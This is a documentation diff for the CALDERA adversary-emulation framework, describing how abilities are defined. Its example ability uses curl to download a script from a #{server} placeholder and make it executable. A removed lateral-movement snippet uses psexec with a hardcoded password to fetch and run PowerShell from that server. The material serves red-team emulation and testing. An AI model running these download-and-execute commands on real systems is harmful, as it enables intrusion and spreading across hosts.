@@ -24,8 +24,8 @@ Below is an example ability. Read this carefully, it will be referenced later on
   technique:
     attack_id: T1016
     name: System Network Configuration Discovery
-  executors:
-    bash:
+  platforms:
+    darwin:
       command: |
         curl -sk -X POST -H 'file:wifi.sh' #{server}/file/download > /tmp/wifi.sh &&
         chmod +x /tmp/wifi.sh
@@ -47,10 +47,7 @@ for where CALDERA is (IP, FQDN, etc), if an ability wants to reference CALDERA i
 In the ability example above, note the usage of the #{server} variable.
 
 The group variable is a bit more advanced. This is useful primarily for lateral movement abilities where
-the agent may move itself to a new host. A snippet of what this may look like (for PSExec) would be
-```
-psexec \\127.0.0.1 -u administrator -p password123 Powershell.exe iex (irm -Method Post -Headers @{'file'='54ndc47.ps1'}  #{server}/file/render?group=#{group})
-```
+the agent may move itself to a new host. 
 
 ### Download files from CALDERA to an agent
 
